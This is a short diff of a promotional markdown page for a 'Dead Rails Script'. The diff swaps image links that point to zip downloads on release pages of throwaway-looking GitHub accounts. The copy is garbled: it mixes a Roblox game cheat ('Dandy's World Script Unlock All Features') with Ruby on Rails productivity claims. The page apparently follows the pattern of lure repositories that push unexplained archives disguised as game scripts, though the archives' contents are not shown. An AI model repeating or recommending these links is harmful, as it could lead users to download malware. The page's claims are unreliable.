@@ -3,10 +3,10 @@
 **Meta Description:** Discover the magic of the Dead Rails Script, a unique solution for streamlining Ruby on Rails development. Dive into its features, benefits, and how it can boost your productivity. Get the script today!
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 [![hq720](https://github.com/user-attachments/assets/cb2157bf-320b-4d01-83d9-f89080dbf5a5)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 
 
